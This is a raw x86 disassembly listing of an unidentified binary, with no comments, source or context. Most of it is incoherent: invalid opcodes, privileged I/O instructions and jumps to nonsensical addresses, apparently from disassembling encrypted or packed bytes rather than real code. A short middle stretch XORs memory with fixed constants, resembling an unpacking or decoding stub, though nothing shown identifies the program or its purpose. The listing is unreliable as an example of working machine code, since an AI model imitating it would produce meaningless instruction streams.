  411431:	fs inc edi
  411433:	cmp    BYTE PTR [ebx-0x7e97924c],cl
  411439:	fld    TBYTE PTR ds:0x7c4d9f00
  41143f:	sbb    BYTE PTR [ebx],0xc8
  411442:	adc    BYTE PTR [ebx+ebp*4-0x659eb2e5],0xba
  41144a:	cmc    
  41144b:	ffreep st(2)
  41144e:	cwde   
  41144f:	cmc    
  411450:	test   cl,bl
  411452:	repz mov dh,0xc0
  411455:	push   DWORD PTR [edx+0x463355fa]
  41145b:	add    DWORD PTR [esi-0x52e1e8e],ebp
  411461:	stos   BYTE PTR es:[edi],al
  411462:	or     BYTE PTR [eax-0x20],cl
  411465:	push   ss
  411466:	and    eax,0x6c05c5a
  41146b:	outs   dx,DWORD PTR ds:[esi]
  41146c:	mov    al,ds:0x9c329aa4
  411471:	dec    ebp
  411472:	lods   eax,DWORD PTR ds:[esi]
  411473:	cwde   
  411474:	addr16 dec eax
  411476:	mov    esp,0x9e47b449
  41147b:	mov    dh,0x35
  41147d:	jo     0x411403
  41147f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411480:	fldcw  WORD PTR [ebp+0x10]
  411483:	cmp    BYTE PTR [eax+0x6c],cl
  411486:	cmp    al,0xda
  411488:	cdq    
  411489:	xlat   BYTE PTR ds:[ebx]
  41148a:	and    ecx,esi
  41148c:	or     DWORD PTR [edx],ebp
  41148e:	ror    BYTE PTR [ebp+edx*2+0x53],0xe9
  411493:	loop   0x41141e
  411495:	mov    ebp,0x348cbaef
  41149a:	mov    al,ds:0x8f704c49
  41149f:	mov    sp,0x7682
  4114a3:	jl     0x411508
  4114a5:	gs xor dl,BYTE PTR cs:[ebp-0x33183486]
  4114ad:	inc    edi
  4114ae:	add    al,0xfd
  4114b0:	call   0xafca3aea
  4114b5:	jl     0x4114d3
  4114b7:	adc    eax,DWORD PTR [eax+edi*2-0x167ee99e]
  4114be:	lahf   
  4114bf:	lahf   
  4114c0:	sbb    edx,DWORD PTR [ebx]
  4114c2:	add    DWORD PTR [esi+0x42],ebp
  4114c5:	jecxz  0x4114ee
  4114c7:	dec    edi
  4114c8:	sbb    dl,BYTE PTR [ebx+0x11ca1165]
  4114ce:	jmp    0xa819:0x950ae47
  4114d5:	add    al,0x45
  4114d7:	add    al,0xfc
  4114d9:	lds    esi,FWORD PTR [esi+0x21546578]
  4114df:	stc    
  4114e0:	push   ds
  4114e1:	xor    BYTE PTR [eax+eax*8],dl
  4114e4:	xchg   ecx,eax
  4114e5:	loope  0x411479
  4114e7:	hlt    
  4114e8:	jbe    0x4114d5
  4114ea:	fnstsw WORD PTR [ecx+0x6d0c397e]
  4114f0:	icebp  
  4114f1:	add    BYTE PTR [ecx-0xa],0x2e
  4114f5:	adc    eax,0x241ec611
  4114fa:	cmp    eax,0x88b9f1b7
  4114ff:	in     eax,0x9b
  411501:	fs popa 
  411503:	in     eax,dx
  411504:	and    BYTE PTR [edi-0x2261cee9],ch
  41150a:	jne    0x4114ff
  41150c:	int    0xbf
  41150e:	shl    BYTE PTR [edx+0x3ad12a6f],1
  411514:	xor    DWORD PTR [ecx+0x6c0fb252],0x28
  41151b:	js     0x411575
  41151d:	sahf   
  41151e:	in     al,dx
  41151f:	cmc    
  411520:	cld    
  411521:	xchg   BYTE PTR [ebx-0x7],bl
  411524:	retf   
  411525:	sbb    ah,bh
  411527:	sub    eax,0x6107656e
  41152c:	adc    BYTE PTR [ebp-0xe66671a],0x4
  411533:	inc    edi
  411534:	in     al,dx
  411535:	imul   ecx,DWORD PTR [ebp-0xa2af134],0xffffff9c
  41153c:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41153e:	dec    ecx
  41153f:	call   0xf28:0x8c8606d9
  411546:	pavgb  mm4,QWORD PTR [edx-0x1c7e83fa]
  41154d:	dec    edx
  41154e:	mov    bl,0x72
  411550:	js     0x411526
  411552:	jae    0x411500
  411554:	loop   0x4115c0
  411556:	and    ebp,DWORD PTR [edi-0x55e9a926]
  41155c:	int    0x45
  41155e:	imul   esp,ebp,0x491ae9a5
  411564:	aaa    
  411565:	ret    
  411566:	stc    
  411567:	loope  0x4115a5
  411569:	jmp    0x41150d
  41156b:	jge    0x411560
  41156d:	and    ebx,edi
  41156f:	movlhps xmm1,xmm6
  411572:	out    dx,eax
  411573:	push   cs
  411574:	inc    esp
  411575:	xchg   ecx,eax
  411576:	push   ecx
  411577:	jmp    0xad933a75
  41157c:	mov    edx,0xf76cefcb
  411581:	jo     0x411568
  411583:	adc    BYTE PTR [ebx-0x13],0x7
  411587:	arpl   WORD PTR [ebx+eiz*1+0x35],si
  41158b:	fsub   DWORD PTR [ebx-0x5b]
  41158e:	bndldx bnd0,[ebx-0x36]
  411592:	xchg   BYTE PTR [edi+0x27b066d],bh
  411598:	adc    DWORD PTR [edi+0x58],esi
  41159b:	sub    esi,eax
  41159d:	cwde   
  41159e:	xchg   ebp,eax
  41159f:	pop    ebx
  4115a0:	push   ds
  4115a1:	mov    DWORD PTR [ebx],edi
  4115a3:	into   
  4115a4:	mov    edi,0x954e2e4a
  4115a9:	(bad)  
  4115aa:	sbb    bl,cl
  4115ac:	mov    WORD PTR [ebx+0x68],ds
  4115af:	(bad)  
  4115b0:	retf   
  4115b1:	push   0x8db5917d
  4115b6:	pop    ds
  4115b7:	(bad)  
  4115b8:	jmp    0x9a948108
  4115bd:	pop    es
  4115be:	inc    ebx
  4115bf:	mov    bh,0x77
  4115c1:	jg     0x411632
  4115c3:	sub    eax,0x13866c22
  4115c8:	mov    esi,0x71ba1cca
  4115cd:	addr16 mov ds:0x8350,al
  4115d1:	mov    al,ds:0xd7bb41f3
  4115d6:	leave  
  4115d7:	jecxz  0x41159f
  4115d9:	outs   dx,BYTE PTR ds:[esi]
  4115da:	push   ebp
  4115db:	loopne 0x41161d
  4115dd:	aam    0xf6
  4115df:	push   eax
  4115e0:	mov    ecx,0xb80be06a
  4115e5:	lock push edx
  4115e7:	xor    eax,0xb34d2e47
  4115ec:	mov    bl,0x6a
  4115ee:	dec    edi
  4115ef:	mov    WORD PTR [ecx],ds
  4115f1:	imul   esi,edi,0x31
  4115f4:	dec    edi
  4115f5:	xor    dh,BYTE PTR [edx+0x76]
  4115f8:	shl    BYTE PTR [eax+edx*4-0x5e],cl
  4115fc:	mov    ecx,0xaabf3990
  411601:	pop    eax
  411602:	and    al,0xfb
  411604:	ret    
  411605:	mov    esp,0x95334e7d
  41160a:	in     al,dx
  41160b:	mov    ch,0x8c
  41160d:	mov    eax,ds:0x9eafdd1f
  411612:	adc    DWORD PTR [edi-0x749a74f9],ebp
  411618:	clc    
  411619:	xchg   edx,eax
  41161a:	inc    esp
  41161b:	jno    0x4115f2
  41161d:	mov    eax,0x4648d710
  411622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411623:	div    DWORD PTR [ebx+0xe]
  411626:	xchg   dl,cl
  411628:	xor    al,0x6a
  41162a:	push   0x3d94c1db
  41162f:	pop    ebx
  411630:	jae    0x4115bc
  411632:	push   0xffffffce
  411634:	scas   eax,DWORD PTR es:[edi]
  411635:	or     BYTE PTR ds:0x8fb22808,ch
  41163b:	pop    edi
  41163c:	test   eax,0x8fd25b02
  411641:	jmp    0xd5cf:0xfc276b24
  411648:	js     0x41168e
  41164a:	jns    0x41163b
  41164c:	sbb    eax,0x2317ae52
  411651:	lahf   
  411652:	push   ebx
  411653:	jo     0x4115f4
  411655:	sbb    BYTE PTR [esi+0x2f],ah
  411658:	ds (bad) 
  41165b:	popw   es
  41165d:	xor    BYTE PTR [eax+0x7c48f716],bh
  411663:	data16 gs je 0x411619
  411667:	in     eax,dx
  411668:	jo     0x4116e0
  41166a:	jecxz  0x411664
  41166c:	and    BYTE PTR ds:0x19168871,0xde
  411673:	sbb    BYTE PTR [eax+eiz*4-0x70bc4cc3],cl
  41167a:	iret   
  41167b:	lock mov cl,0x1e
  41167e:	jbe    0x411673
  411680:	fs sub edi,esi
  411683:	pop    esp
  411684:	xor    edi,DWORD PTR gs:[ebp-0x7e]
  411688:	sbb    DWORD PTR [edi+0x4d718f7a],edi
  41168e:	cwde   
  41168f:	out    0x42,eax
  411691:	(bad)  
  411692:	popa   
  411693:	(bad)  
  411694:	sub    ecx,DWORD PTR [ebp+0x60]
  411697:	dec    esp
  411698:	mov    WORD PTR [esp+eax*4],fs
  41169b:	push   edi
  41169c:	adc    eax,0x3a930b36
  4116a1:	and    dl,ah
  4116a3:	xchg   esi,eax
  4116a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a5:	sub    BYTE PTR [esi+0x28d9f4c6],cl
  4116ab:	test   DWORD PTR [esi+0x3d82ed45],esi
  4116b1:	sbb    eax,0xb90f0acc
  4116b6:	test   al,0xd1
  4116b8:	fcmovne st,st(4)
  4116ba:	push   ss
  4116bb:	loopne 0x41167b
  4116bd:	and    bl,BYTE PTR [esp+ebx*2-0x25590f00]
  4116c4:	int3   
  4116c5:	cmp    ah,al
  4116c7:	nop
  4116c8:	ins    DWORD PTR es:[edi],dx
  4116c9:	jns    0x4116ee
  4116cb:	fbstp  TBYTE PTR [ebx-0x6c]
  4116ce:	push   eax
  4116cf:	enter  0xfea6,0xf5
  4116d3:	iret   
  4116d4:	ins    BYTE PTR es:[edi],dx
  4116d5:	and    DWORD PTR [ebx+0x2648b7d1],edx
  4116db:	ret    0xbbf6
  4116de:	cld    
  4116df:	clc    
  4116e0:	mov    ebp,0x9690ae34
  4116e5:	out    dx,al
  4116e6:	or     BYTE PTR gs:[edi],dh
  4116e9:	adc    esp,DWORD PTR [ecx-0x46]
  4116ec:	or     DWORD PTR [edx-0x6efb5785],ebp
  4116f2:	scas   al,BYTE PTR es:[edi]
  4116f3:	xchg   ebx,eax
  4116f4:	jmp    0x411751
  4116f6:	sub    DWORD PTR [edx-0x38],esi
  4116f9:	xchg   esi,eax
  4116fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116fb:	jg     0x41171a
  4116fd:	dec    ecx
  4116fe:	dec    eax
  4116ff:	clc    
  411700:	imul   esi,ebx,0x41562976
  411706:	add    al,0x37
  411708:	rcl    DWORD PTR [edi],1
  41170a:	test   al,0xde
  41170c:	push   ebp
  41170d:	fistp  QWORD PTR [edx+0x79ae7d7a]
  411713:	sar    BYTE PTR [eax+0x63],cl
  411716:	repz mov bh,0x4a
  411719:	mov    cl,0x44
  41171b:	and    ebx,DWORD PTR [edx-0x1e]
  41171e:	jmp    0xe0dca77c
  411723:	stos   DWORD PTR es:[edi],eax
  411724:	jp     0x4116b1
  411726:	mov    edx,ecx
  411728:	cmp    eax,0x772d8c92
  41172d:	sbb    DWORD PTR [ecx-0x5c6592a1],esp
  411733:	adc    esi,ecx
  411735:	(bad)  [ebx]
  411737:	or     eax,0xee8759d3
  41173c:	xchg   esp,eax
  41173d:	xchg   esi,eax
  41173e:	(bad)  
  41173f:	dec    eax
  411740:	and    BYTE PTR [eax],dh
  411742:	icebp  
  411743:	jmp    0xd0c1cce1
  411748:	outs   dx,DWORD PTR ds:[esi]
  411749:	popa   
  41174a:	xchg   esp,eax
  41174b:	ja     0x4116f1
  41174d:	es ret 
  41174f:	in     eax,0x12
  411751:	inc    ecx
  411752:	pop    esp
  411753:	jl     0x41171d
  411755:	mov    eax,0xccfc9f6e
  41175a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41175b:	pusha  
  41175c:	push   ds
  41175d:	clc    
  41175e:	nop
  41175f:	dec    ebp
  411760:	test   al,0x8
  411762:	sbb    DWORD PTR [edx+eax*4-0x2],ebp
  411766:	xor    eax,0x60ba437b
  41176b:	les    eax,FWORD PTR [ecx]
  41176d:	int3   
  41176e:	in     eax,dx
  41176f:	push   DWORD PTR [edi+0x8]
  411772:	mov    bh,0x1f
  411774:	fsubr  DWORD PTR [ebp-0x3b9da537]
  41177a:	adc    eax,0x77c79f9b
  41177f:	mov    edi,0xcbd86245
  411784:	and    al,0x80
  411786:	stos   DWORD PTR es:[edi],eax
  411787:	sub    BYTE PTR [ebx],al
  411789:	jmp    0x64cdd204
  41178e:	ret    
  41178f:	test   eax,0x259a9385
  411794:	rcl    cl,0xbe
  411797:	loopne 0x4117be
  411799:	icebp  
  41179a:	(bad)  
  41179b:	outs   dx,DWORD PTR ds:[esi]
  41179c:	ss xchg esi,ebx
  41179f:	ss (bad) 
  4117a1:	sahf   
  4117a2:	jmp    FWORD PTR [ebp+0x25]
  4117a5:	push   0x69
  4117a7:	or     esp,DWORD PTR [ebp-0x63]
  4117aa:	repz add al,0xd1
  4117ad:	in     al,dx
  4117ae:	sbb    al,0x22
  4117b0:	imul   DWORD PTR [ebp-0x6c]
  4117b3:	inc    esi
  4117b4:	aad    0x20
  4117b6:	jmp    0x4117d4
  4117b8:	daa    
  4117b9:	jmp    0x2f1fc3bf
  4117be:	inc    ecx
  4117bf:	add    al,0xc7
  4117c1:	xchg   edi,eax
  4117c2:	inc    DWORD PTR [esi-0x39]
  4117c5:	sub    bh,ah
  4117c7:	ror    eax,1
  4117c9:	pop    ebx
  4117ca:	or     eax,esp
  4117cc:	fs pop esp
  4117ce:	mov    fs,WORD PTR [ebp+0x6]
  4117d1:	pop    ecx
  4117d2:	jo     0x4117f4
  4117d4:	stc    
  4117d5:	imul   edx,edi,0xffffffb8
  4117d8:	das    
  4117d9:	mov    bl,cl
  4117db:	hlt    
  4117dc:	cmp    dl,ch
  4117de:	push   ebp
  4117df:	xor    DWORD PTR [edx-0x68],edx
  4117e2:	mov    ebp,0x3d0e94b1
  4117e7:	rcr    BYTE PTR [eax-0x68],0x86
  4117eb:	iret   
  4117ec:	jne    0x411849
  4117ee:	out    0xa3,al
  4117f0:	inc    ecx
  4117f1:	out    dx,eax
  4117f2:	and    BYTE PTR [esi+0x3e],al
  4117f5:	scas   al,BYTE PTR es:[edi]
  4117f6:	stos   DWORD PTR es:[edi],eax
  4117f7:	je     0x41184e
  4117f9:	sub    eax,0x6c574ec
  4117fe:	xchg   ebx,eax
  4117ff:	add    dh,bl
  411801:	jl     0x41181a
  411803:	and    dl,BYTE PTR [eax]
  411805:	mov    eax,DWORD PTR [ebx+edi*2]
  411808:	pop    esp
  411809:	retf   
  41180a:	int    0x9c
  41180c:	mov    edx,DWORD PTR [edi]
  41180e:	int3   
  41180f:	fs dec esi
  411811:	imul   esi,ecx,0x3d
  411814:	cmp    ah,ah
  411816:	mov    ah,0x6b
  411818:	sbb    al,0x77
  41181a:	push   esi
  41181b:	bound  ebp,QWORD PTR [edi+0xb]
  41181e:	enter  0xbdf2,0x53
  411822:	dec    edi
  411823:	cmp    ebp,DWORD PTR ds:0x88c6ee95
  411829:	ja     0x411841
  41182b:	push   es
  41182c:	pushf  
  41182d:	push   es
  41182e:	ds add al,0xcc
  411831:	inc    edi
  411832:	out    dx,al
  411833:	mov    ebx,0xa7c0ac75
  411838:	push   eax
  411839:	push   ebp
  41183a:	data16 xor al,0xa9
  41183d:	and    BYTE PTR [ecx+ebx*1+0x6c],dl
  411841:	outs   dx,DWORD PTR ds:[esi]
  411842:	dec    ebp
  411843:	ins    BYTE PTR es:[edi],dx
  411844:	ja     0x411804
  411846:	or     DWORD PTR [esi-0x42],ecx
  411849:	dec    esi
  41184a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184b:	adc    eax,0xe0edddae
  411850:	gs dec ebx
  411852:	push   edx
  411853:	adc    ah,ch
  411855:	mov    ds:0x29b29592,al
  41185a:	outs   dx,DWORD PTR ds:[esi]
  41185b:	xchg   edx,eax
  41185c:	push   ecx
  41185d:	xchg   ecx,eax
  41185e:	mov    dl,0x7f
  411860:	and    bl,dh
  411862:	call   0x93f15ae0
  411867:	mov    eax,ds:0x19851364
  41186c:	sbb    DWORD PTR [ebx+0x7d522c40],esi
  411872:	stos   DWORD PTR es:[edi],eax
  411873:	lock imul edx,esi,0x9b058d5e
  41187a:	(bad)  
  41187c:	or     edx,DWORD PTR [eax-0x7f0a7939]
  411882:	int3   
  411883:	ror    BYTE PTR [ecx+0x55],0xad
  411887:	or     cl,BYTE PTR [ecx]
  411889:	sbb    ecx,edx
  41188b:	call   0xcdcf:0x2105994
  411892:	fild   WORD PTR [esi-0x5d]
  411895:	cmp    DWORD PTR ds:0xaa1ddf1a,0x7af20d40
  41189f:	scas   eax,DWORD PTR es:[edi]
  4118a0:	(bad)  
  4118a1:	mov    edx,DWORD PTR [edx-0xc]
  4118a4:	fnstenv [ebp+0x46f22b07]
  4118aa:	neg    BYTE PTR [esi-0x2f0e6f1b]
  4118b0:	push   cs
  4118b1:	mov    WORD PTR [esi-0x42222ebc],ds
  4118b7:	jb     0x411915
  4118b9:	add    BYTE PTR [ecx+0x534cf7a8],bl
  4118bf:	sub    bh,al
  4118c1:	pushf  
  4118c2:	inc    ecx
  4118c3:	sub    al,BYTE PTR [esi+0x55265b15]
  4118c9:	shl    edx,0xb8
  4118cc:	test   BYTE PTR [edi+eiz*4],ah
  4118cf:	mov    ebx,0x772b6759
  4118d4:	mov    BYTE PTR [ecx],bh
  4118d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118d7:	ret    
  4118d8:	ins    DWORD PTR es:[edi],dx
  4118d9:	(bad)  
  4118db:	std    
  4118dc:	jg     0x411938
  4118de:	sub    BYTE PTR ds:[edx],al
  4118e1:	push   esp
  4118e2:	stc    
  4118e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e4:	xchg   ebx,eax
  4118e5:	add    ebx,DWORD PTR gs:[esi]
  4118e8:	retf   0xc457
  4118eb:	(bad)  
  4118ed:	adc    cl,BYTE PTR [eax+0x21]
  4118f0:	jns    0x411922
  4118f2:	arpl   WORD PTR [eax+0x6eaaf6c],dx
  4118f8:	(bad)  
  4118fa:	mov    al,ds:0xa99f8765
  4118ff:	js     0x411954
  411901:	mov    eax,ds:0xda7a4d83
  411906:	std    
  411907:	push   eax
  411908:	jb     0x4118f8
  41190a:	cld    
  41190b:	ins    DWORD PTR es:[edi],dx
  41190c:	adc    al,0xbe
  41190e:	sbb    DWORD PTR [esi+ebx*4+0x69c45c00],0x91385081
  411919:	xor    dh,BYTE PTR [edi+edi*1]
  41191c:	inc    esi
  41191d:	lds    ecx,FWORD PTR [ebx+0x47b8b13]
  411923:	push   eax
  411924:	push   edi
  411925:	push   edx
  411926:	call   0x41dfae
  41192b:	shld   edx,eax,0x2
  41192f:	mov    ecx,edx
  411931:	xor    edx,edx
  411933:	or     ecx,edx
  411935:	mov    edx,DWORD PTR [esi]
  411937:	mov    edi,DWORD PTR [esi+0x4]
  41193a:	shl    eax,0x2
  41193d:	or     eax,DWORD PTR [ebp+0x10]
  411940:	xor    edi,ecx
  411942:	xor    edx,eax
  411944:	xor    edx,0xba699573
  41194a:	xor    edi,0x9c0a89d8
  411950:	mov    DWORD PTR [esi],edx
  411952:	mov    DWORD PTR [esi+0x4],edi
  411955:	jmp    0x418549
  41195a:	mov    eax,DWORD PTR [ebp-0x24]
  41195d:	add    eax,DWORD PTR [ebp-0x4]
  411960:	mov    DWORD PTR [ebp-0x28],eax
  411963:	mov    eax,DWORD PTR [ebp-0x28]
  411966:	mov    eax,DWORD PTR [ebp-0x4]
  411969:	mov    eax,DWORD PTR [ebp-0x28]
  41196c:	mov    eax,DWORD PTR [eax+0xc]
  41196f:	mov    edx,DWORD PTR [ebp-0x4]
  411972:	movzx  eax,WORD PTR [edx+eax*1]
  411976:	cdq    
  411977:	shld   edx,eax,0x2
  41197b:	xor    edx,ecx
  41197d:	mov    DWORD PTR [ebp+0xc],edx
  411980:	mov    edx,DWORD PTR [ebp-0x58]
  411983:	jmp    0x411f0d
  411988:	jle    0x411958
  41198a:	addr16 ss daa 
  41198d:	push   ds
  41198e:	ds sahf 
  411990:	dec    ebx
  411991:	clc    
  411992:	pushf  
  411993:	outs   dx,BYTE PTR ds:[esi]
  411994:	push   ebx
  411995:	scas   al,BYTE PTR es:[edi]
  411996:	mov    BYTE PTR [edx+0x161632fe],dh
  41199c:	cmp    eax,0x48161604
  4119a1:	jns    0x4119c9
  4119a3:	out    0x4e,eax
  4119a5:	je     0x4119be
  4119a7:	inc    ebx
  4119a8:	fs addr16 mov esi,0xc5c399c
  4119af:	mov    eax,0xfe22fb72
  4119b4:	mov    cl,cl
  4119b6:	in     eax,dx
  4119b7:	int3   
  4119b8:	xlat   BYTE PTR ds:[ebx]
  4119b9:	(bad)  
  4119bb:	mov    ?,eax
  4119bd:	mov    ecx,0xb497362f
  4119c2:	leave  
  4119c3:	leave  
  4119c4:	fst    DWORD PTR [edx+0x2a]
  4119c7:	fucomi st,st(0)
  4119c9:	mov    dh,0x1b
  4119cb:	xchg   esi,eax
  4119cc:	dec    esp
  4119cd:	imul   esp,DWORD PTR [eax+0x8910826],0xffffff8b
  4119d4:	or     ebp,DWORD PTR [edx]
  4119d6:	call   0xd91:0xd77ed1c9
  4119dd:	add    bh,BYTE PTR [eax]
  4119df:	xchg   esi,eax
  4119e0:	add    BYTE PTR [edx+0x366c81da],dh
  4119e6:	jge    0x411980
  4119e8:	lods   al,BYTE PTR ds:[esi]
  4119e9:	mov    ds:0xa2319fd7,eax
  4119ee:	pop    ds
  4119ef:	pop    ds
  4119f0:	xor    BYTE PTR [ebx-0x68c2236d],dh
  4119f6:	fistp  WORD PTR [esi+0x9ed5004]
  4119fc:	dec    edi
  4119fd:	sbb    dh,BYTE PTR [eax-0x43c3014]
  411a03:	gs nop
  411a05:	pop    ss
  411a06:	dec    edx
  411a07:	push   ss
  411a08:	inc    esp
  411a09:	or     edi,edx
  411a0b:	xchg   ecx,eax
  411a0c:	cmp    dh,BYTE PTR [eax+0xe18f6f0]
  411a12:	jae    0x4119d4
  411a14:	xchg   esi,eax
  411a15:	(bad)
  411a18:	xchg   BYTE PTR [esi],ch
  411a1a:	stos   BYTE PTR es:[edi],al
  411a1b:	push   edx
  411a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a1d:	pop    es
  411a1e:	enter  0xa9a0,0xaa
  411a22:	add    eax,0xb396a931
  411a27:	pop    edx
  411a28:	ret    
  411a29:	(bad)
  411a2c:	mov    eax,ds:0x6020e597
  411a31:	pushf  
  411a32:	arpl   WORD PTR [esi],si
  411a34:	adc    edx,DWORD PTR [edx+0x6e]
  411a37:	adc    eax,0x3f8b50cb
  411a3c:	adc    ebp,DWORD PTR [edi-0x74]
  411a3f:	int3   
  411a40:	test   eax,0x26a5cb6c
  411a45:	cmp    dl,BYTE PTR [eax]
  411a47:	or     ch,dl
  411a49:	iret   
  411a4a:	xchg   edi,eax
  411a4b:	dec    ecx
  411a4c:	std    
  411a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a4e:	aaa    
  411a4f:	xor    DWORD PTR [ebp+0x48cb9f42],ebp
  411a55:	lds    ecx,FWORD PTR [ebp+edx*4+0x55]
  411a59:	sahf   
  411a5a:	jp     0x411aa9
  411a5c:	dec    ebp
  411a5d:	mov    esp,0xb738de71
  411a62:	outs   dx,BYTE PTR ds:[esi]
  411a63:	bound  esi,QWORD PTR [ecx]
  411a65:	mov    ds,WORD PTR [ecx-0x25]
  411a68:	sbb    al,0xfe
  411a6a:	xchg   DWORD PTR [ebp-0x26743734],esp
  411a70:	or     BYTE PTR [esi+0x234a0abb],cl
  411a76:	push   esi
  411a77:	push   edx
  411a78:	mov    cl,0xc0
  411a7a:	push   ebp
  411a7b:	jns    0x411acc
  411a7d:	pop    eax
  411a7e:	inc    esp
  411a7f:	xchg   ecx,eax
  411a80:	mov    ebp,0xc7925b33
  411a85:	xchg   ebp,eax
  411a86:	xchg   edx,eax
  411a87:	sub    DWORD PTR [ebx],0xffffffdb
  411a8a:	mov    esi,0x5b61d05d
  411a8f:	pop    edi
  411a90:	fistp  DWORD PTR [eax]
  411a92:	sbb    bh,BYTE PTR [edx-0x64]
  411a95:	sbb    al,0x8b
  411a97:	add    edi,esp
  411a99:	xlat   BYTE PTR ds:[ebx]
  411a9a:	mov    bh,0x69
  411a9c:	rcr    esi,1
  411a9e:	pop    ecx
  411a9f:	out    dx,eax
  411aa0:	or     ebx,DWORD PTR [esi+0x3c]
  411aa3:	inc    edi
  411aa4:	sub    ebx,DWORD PTR [ecx+0x69cfd8cf]
  411aaa:	dec    ecx
  411aab:	mov    ds:0xc46fa873,eax
  411ab0:	popa   
  411ab1:	jg     0x411a49
  411ab3:	scas   al,BYTE PTR es:[edi]
  411ab4:	or     ebp,esi
  411ab6:	in     eax,0xb3
  411ab8:	std    
  411ab9:	sub    dl,bh
  411abb:	fadd   DWORD PTR [edi+0xc]
  411abe:	cmp    cl,ah
  411ac0:	or     ebx,eax
  411ac2:	fwait
  411ac3:	cmp    DWORD PTR [edi+0x2e],0xffffffa2
  411ac7:	mov    cs,WORD PTR [ebx]
  411ac9:	push   ds
  411aca:	jno    0x411b0d
  411acc:	out    0x3,al
  411ace:	or     DWORD PTR [ebx],esi
  411ad0:	stos   DWORD PTR es:[edi],eax
  411ad1:	mov    edx,0x90cf2915
  411ad6:	cwde   
  411ad7:	inc    esp
  411ad8:	je     0x411b35
  411ada:	adc    eax,0x85753543
  411adf:	xchg   esp,eax
  411ae0:	test   al,0xe4
  411ae2:	inc    esi
  411ae3:	xchg   ebp,eax
  411ae4:	and    al,dl
  411ae6:	fcmovu st,st(3)
  411ae8:	gs mov eax,0x6434d2c0
  411aee:	jge    0x411afa
  411af0:	ss sti 
  411af2:	fwait
  411af3:	div    BYTE PTR [ebp+0x3025f20f]
  411af9:	fisttp DWORD PTR [ecx+ebx*4]
  411afc:	and    esp,DWORD PTR ds:0xdd3f9a8e
  411b02:	mov    bh,0xeb
  411b04:	add    ch,dl
  411b06:	and    bh,BYTE PTR [edi+0x6c]
  411b09:	jecxz  0x411ad4
  411b0b:	test   dl,0xcf
  411b0e:	mov    ch,0x3f
  411b10:	cmp    BYTE PTR [edx-0x6b],ah
  411b13:	out    dx,eax
  411b14:	cwde   
  411b15:	mov    BYTE PTR [esi-0x55],0xd0
  411b19:	push   ebx
  411b1a:	aam    0x50
  411b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b1d:	push   esp
  411b1e:	sub    dl,BYTE PTR [edx+0x4fe0dfc]
  411b24:	fsub   DWORD PTR [ecx]
  411b26:	push   es
  411b27:	cs and ecx,ebp
  411b2a:	jge    0x411b5c
  411b2c:	iret   
  411b2d:	gs (bad) 
  411b2f:	popa   
  411b30:	fstp   TBYTE PTR [edx-0x387b8c7a]
  411b36:	gs popf 
  411b38:	pop    eax
  411b39:	adc    bh,dl
  411b3b:	xchg   edi,eax
  411b3c:	add    al,0xc1
  411b3e:	rcl    DWORD PTR [edx],cl
  411b40:	rcl    BYTE PTR [ebx],0xa4
  411b43:	imul   ebp,DWORD PTR [edi],0x2eb51b5f
  411b49:	call   0x1ea1:0xc5427098
  411b50:	aad    0x54
  411b52:	test   al,0xf9
  411b54:	sbb    dh,ah
  411b56:	icebp  
  411b57:	pop    edx
  411b58:	sub    BYTE PTR [edi-0x30],bh
  411b5b:	and    DWORD PTR [esi-0x3ac748e3],ebx
  411b61:	imul   edx,DWORD PTR [edi+ebp*1],0x728dcab3
  411b68:	jp     0x411afc
  411b6a:	popf   
  411b6b:	shr    DWORD PTR ds:0xd6fea213,0x3e
  411b72:	pop    ebx
  411b73:	pop    eax
  411b74:	jb     0x411b62
  411b76:	call   0x6960c77d
  411b7b:	pushf  
  411b7c:	xchg   esi,eax
  411b7d:	loopne 0x411b89
  411b7f:	or     eax,0x856e798
  411b84:	and    DWORD PTR [eax+ebx*4-0x9295b2e],ebx
  411b8b:	(bad)  
  411b8c:	mov    al,0xa2
  411b8e:	pop    ebx
  411b8f:	test   ecx,ebx
  411b91:	jne    0x411c01
  411b93:	ret    
  411b94:	inc    eax
  411b95:	div    DWORD PTR [edx]
  411b97:	xor    cl,BYTE PTR [eax+0x47]
  411b9a:	repz cmp dl,bh
  411b9d:	push   ss
  411b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b9f:	fdivr  st,st(4)
  411ba1:	inc    ebp
  411ba2:	add    ecx,edi
  411ba4:	bnd jge 0x411b5f
  411ba7:	lods   eax,DWORD PTR ds:[esi]
  411ba8:	mov    dh,0xac
  411baa:	leave  
  411bab:	mov    edx,0x8f5e723e
  411bb0:	adc    esi,edi
  411bb2:	mov    dl,0x28
  411bb4:	jno    0x411bda
  411bb6:	jg     0x411bd4
  411bb8:	aas    
  411bb9:	jl     0x411ba9
  411bbb:	or     cl,bl
  411bbd:	std    
  411bbe:	daa    
  411bbf:	cmp    dh,ah
  411bc1:	pop    ds
  411bc2:	cmp    DWORD PTR [edx],ecx
  411bc4:	cld    
  411bc5:	pop    eax
  411bc6:	jg     0x411bb5
  411bc8:	call   0x27a6:0xb6449aec
  411bcf:	es ins BYTE PTR es:[edi],dx
  411bd1:	and    ecx,DWORD PTR ds:0x59cb5631
  411bd7:	ins    DWORD PTR es:[edi],dx
  411bd8:	fadd   DWORD PTR [ebp-0x44]
  411bdb:	push   ebx
  411bdc:	dec    ecx
  411bdd:	or     al,BYTE PTR [esi]
  411bdf:	mov    ebx,0x8c206998
  411be4:	and    dl,BYTE PTR [ebx]
  411be6:	xor    dl,dl
  411be8:	clc    
  411be9:	out    dx,eax
  411bea:	dec    edi
  411beb:	data16 (bad) 
  411bed:	lahf   
  411bee:	jmp    0x411c5c
  411bf0:	int    0x67
  411bf2:	sbb    DWORD PTR [eax+0x17],eax
  411bf5:	push   eax
  411bf6:	(bad)  
  411bf7:	jl     0x411c0b
  411bf9:	xchg   esp,eax
  411bfa:	les    edx,FWORD PTR [eax-0xe8eaba9]
